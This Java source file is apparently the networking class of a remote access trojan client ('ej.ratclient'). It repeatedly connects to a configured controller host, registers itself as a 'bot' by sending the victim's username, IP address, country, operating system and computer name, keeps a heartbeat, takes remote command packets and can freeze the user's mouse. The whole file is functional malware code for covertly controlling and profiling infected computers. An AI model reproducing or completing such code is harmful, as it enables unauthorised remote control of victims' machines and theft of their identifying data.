package ej.ratclient.packet;

import ej.ratclient.EJRATClient;
import ej.ratclient.util.Config;
import ej.ratclient.packet.impl.PacketMouse;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public abstract class PacketReceiver {

    private Thread thread = null;
    private InputStream in = null;
    public OutputStream out = null;
    private Socket socket = null;
    private long lastHeartBeat = System.currentTimeMillis();

    protected void connect() {
        while (!connect(Config.HOST, Config.PORT)) {
            try {
                Thread.sleep(Config.RECONNECTION_DELAY * 1000);
            } catch (InterruptedException e) {
                return;
            }
        }
        botConnect(1, Config.PASSWORD);
        start();
    }

    private boolean connect(String host, int port) {
        socket = new Socket();
        try {
            socket.connect(new InetSocketAddress(host, port));
            socket.setKeepAlive(false);
            in = socket.getInputStream();
            out = socket.getOutputStream();
            return true;
        } catch (IOException e) {
            return false;
        }
    }

    public void start() {
        final ExecutorService thread = Executors.newSingleThreadExecutor();
        thread.submit(new Runnable() {

            public void run() {
                while (true) {
                    try {
                        Thread.sleep(10);
                    } catch (InterruptedException e) {
                        return;
                    }
                    if (PacketMouse.mouseFreeze == 1) {
                        EJRATClient.get().robot.mouseMove(0, 0);
                    }
                    if (lastHeartBeat < 1) {
                        close();
                    }
                    sendPing();
                    try {
                        readIncomingData(in);
                    } catch (IOException e) {
                    }
                }
            }
        });
    }

    protected void readIncomingData(InputStream inStream) throws IOException {
        if (socket.isClosed()) {
            return;
        }
        final int available = inStream.available();
        if (available == 0) {
            return;
        }
        inStream.mark(available);
        final int packetLength = inStream.read() << 8 | inStream.read();
        if (inStream.available() < packetLength) {
            inStream.reset();
            return;
        }
        final byte[] buffer = new byte[packetLength];
        inStream.read(buffer, 0, buffer.length);
        PacketHandler.handlePacket(new Packet(buffer));
    }

    protected void close() {
        try {
            if (in != null) {
                in.close();
            }
            if (out != null) {
                out.close();
            }
            if (socket != null) {
                socket.close();
            }
        } catch (IOException e) {
        }
    }

    public static String getComputerName() {
        InetAddress address = null;
        try {
            address = InetAddress.getLocalHost();
        } catch (Exception ignored) {
            return "N/A";
        }
        return address.getHostName();
    }

    protected void botConnect(int version, String password) {
        try {
            String wan = InetAddress.getLocalHost().getHostAddress();
            PacketBuilder p = new PacketBuilder(1);
            p.putString("1.0");
            p.putString(System.getProperty("user.name"));
            p.putString(wan);
            p.putString(Config.PASSWORD);
            Locale locale = Locale.getDefault();
            p.putString(locale.getDisplayCountry());
            p.putString(System.getProperty("os.name"));
            p.putString(getComputerName());
            out.write(p.toPacket().getPayload());
        } catch (Exception e) {
        }
    }

    protected void sendPing() {
        if (System.currentTimeMillis() - lastHeartBeat > 4000) {
            lastHeartBeat = System.currentTimeMillis();
            try {
                out.write(new PacketBuilder(0).putLong(System.currentTimeMillis()).toPacket().getPayload());
            } catch (Exception e) {
                close();
                connect();
            }
        }
    }

    protected void out(PacketBuilder p) {
        try {
            out.write(p.toPacket().getPayload());
        } catch (Exception e) {
        }
    }
}